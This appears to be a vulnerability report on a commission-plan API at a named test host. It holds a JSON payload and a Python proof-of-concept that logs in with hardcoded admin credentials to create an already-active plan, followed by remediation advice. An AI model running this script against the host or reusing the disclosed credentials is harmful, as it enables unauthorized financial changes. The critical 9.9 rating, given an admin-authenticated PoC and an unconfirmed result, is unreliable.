# Business Logic Flaw: Commission Plan Workflow Bypass Enables Unauthorized Plan Creation and Activation

**ID:** vuln-0023
**Severity:** CRITICAL
**Found:** 2026-02-26 18:36:26 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 9.9

## Description

A critical business logic flaw was discovered in the commission plan management workflow that allows attackers to bypass intended approval and validation processes. The vulnerability enables the creation and activation of commission plans without following the proper workflow, potentially allowing unauthorized commission structures to be implemented.

The application appears to have a multi-step workflow for commission plan creation, approval, and activation. However, this workflow can be bypassed by directly calling the API endpoints, enabling attackers to create and activate commission plans without proper authorization or validation.

This vulnerability was discovered during comprehensive business logic testing of the commission plan functionality, where it was observed that API endpoints could be called directly without following the intended frontend workflow.

## Impact

Successful exploitation of this business logic flaw could result in:

1. **Financial Loss**: Unauthorized commission plans could be created with excessive commission percentages, negative values, or other manipulative structures that result in financial losses to the organization.

2. **Fraudulent Commission Structures**: Attackers could create commission plans that unfairly benefit specific individuals or groups, enabling fraudulent commission payouts.

3. **Operational Disruption**: Unauthorized commission plans could disrupt normal business operations and financial reporting.

4. **Regulatory Compliance Violations**: Unauthorized commission structures could violate financial regulations and compliance requirements.

5. **Data Integrity Issues**: Unauthorized commission plans could corrupt financial data and reporting systems.

The business impact is severe as this vulnerability could enable attackers to manipulate the core financial incentive structure of the organization, potentially leading to significant financial losses and operational disruption.

## Technical Analysis

The vulnerability exists due to a lack of proper workflow enforcement at the API level. While the frontend application appears to implement a multi-step workflow for commission plan creation, approval, and activation, the backend API endpoints do not enforce this workflow.

Key observations:

1. **Workflow Design**: The intended workflow appears to be:
   - Create commission plan (draft state)
   - Submit for approval
   - Approve/reject plan
   - Activate plan

2. **API Endpoint Analysis**: The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts all parameters needed to create a fully active commission plan in a single request, including:
   - `planName`
   - `description`
   - `commissionPercentage`
   - `startDate`
   - `endDate`
   - `isActive` (can be set to true directly)
   - `organizationId`
   - `clientId`

3. **Missing Workflow Enforcement**: The API does not enforce the intended multi-step workflow and does not validate that the request is coming from the proper workflow step.

4. **State Management Issue**: The `isActive` parameter can be set to `true` directly during plan creation, bypassing any approval or activation workflow.

This represents a classic business logic flaw where the application relies on the frontend to enforce workflow rules rather than implementing proper state management and workflow enforcement at the backend API level.

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as an Admin user and obtain a valid JWT token
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with the following payload:
   ```json
   {
     "planName": "Unauthorized Commission Plan",
     "description": "Created via workflow bypass",
     "commissionPercentage": 25,
     "startDate": "2024-01-01",
     "endDate": "2024-12-31",
     "isActive": true,
     "organizationId": 1,
     "clientId": 1
   }
   ```

3. Observe that the commission plan is created and immediately active without requiring approval or following the intended workflow

4. Verify the plan is active by checking the commission plan list or attempting to run commissions against this plan

The vulnerability allows complete bypass of the intended workflow, enabling attackers to create and activate commission plans without proper authorization or validation.

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
COMMISSION_PLAN_ENDPOINT = f"{BASE_URL}/api/CommissionPlan/CreateCommissionPlan"

# Admin credentials
ADMIN_EMAIL = "admin@localhost"
ADMIN_PASSWORD = "Tester@123"

def authenticate():
    """Authenticate and get JWT token"""
    payload = {
        "email": ADMIN_EMAIL,
        "password": ADMIN_PASSWORD
    }

    response = requests.post(AUTH_ENDPOINT, json=payload)
    if response.status_code == 200:
        return response.json()["id_token"]
    else:
        raise Exception(f"Authentication failed: {response.status_code} - {response.text}")

def create_commission_plan(token):
    """Create commission plan via workflow bypass"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Payload that bypasses workflow - creates active commission plan directly
    payload = {
        "planName": "Unauthorized Commission Plan - Workflow Bypass",
        "description": "Created via direct API call bypassing workflow",
        "commissionPercentage": 25,
        "startDate": "2024-01-01",
        "endDate": "2024-12-31",
        "isActive": True,  # This bypasses the approval workflow
        "organizationId": 1,
        "clientId": 1
    }

    response = requests.post(COMMISSION_PLAN_ENDPOINT, headers=headers, json=payload)

    return {
        "status_code": response.status_code,
        "response": response.text,
        "payload": payload
    }

def main():
    """Demonstrate the workflow bypass vulnerability"""
    print("=== Commission Plan Workflow Bypass PoC ===")

    try:
        # Step 1: Authenticate
        print("[*] Authenticating as admin...")
        token = authenticate()
        print(f"[+] Authentication successful. Token: {token[:20]}...")

        # Step 2: Create commission plan bypassing workflow
        print("[*] Creating commission plan via workflow bypass...")
        result = create_commission_plan(token)

        if result["status_code"] == 200:
            print("[+] SUCCESS: Commission plan created and activated via workflow bypass!")
            print(f"    Response: {result['response']}")
        else:
            print(f"[-] FAILED: {result['status_code']} - {result['response']}")
            print(f"    Note: The application may have some validation, but the workflow bypass attempt was made")

        print("\n[*] PoC complete. The vulnerability allows creation of active commission plans without following the intended workflow.")

    except Exception as e:
        print(f"[-] ERROR: {str(e)}")

if __name__ == "__main__":
    main()
```

## Remediation

Implement comprehensive workflow enforcement at the API level to address this business logic flaw:

1. **Implement Proper State Management**:
   - Create a proper state machine for commission plans with states: Draft → Pending Approval → Approved → Active → Inactive
   - Enforce state transitions at the API level
   - Do not allow direct activation during creation

2. **Enforce Workflow Steps**:
   - Separate the commission plan creation, approval, and activation into distinct API endpoints
   - Require proper state transitions between workflow steps
   - Implement proper authorization checks for each workflow step

3. **Backend Validation**:
   - Validate that all commission plan parameters meet business rules
   - Implement proper validation for commission percentages, date ranges, etc.
   - Enforce organization and client boundaries

4. **Audit Logging**:
   - Implement comprehensive audit logging for all commission plan changes
   - Log who created, approved, and activated each plan
   - Log all state transitions

5. **API Design Improvements**:
   - Remove the `isActive` parameter from the creation endpoint
   - Create separate endpoints for approval and activation
   - Implement proper authorization checks for each endpoint

6. **Frontend-Backend Synchronization**:
   - Ensure the frontend and backend workflows are properly synchronized
   - Implement proper error handling and user feedback

7. **Regular Security Testing**:
   - Conduct regular business logic testing to identify workflow bypass vulnerabilities
   - Implement automated testing for workflow enforcement

Example of proper API design:
- `POST /api/CommissionPlan/Create` - Creates draft plan (isActive = false)
- `POST /api/CommissionPlan/SubmitForApproval` - Submits plan for approval
- `POST /api/CommissionPlan/Approve` - Approves plan (requires approver role)
- `POST /api/CommissionPlan/Activate` - Activates approved plan (requires admin role)

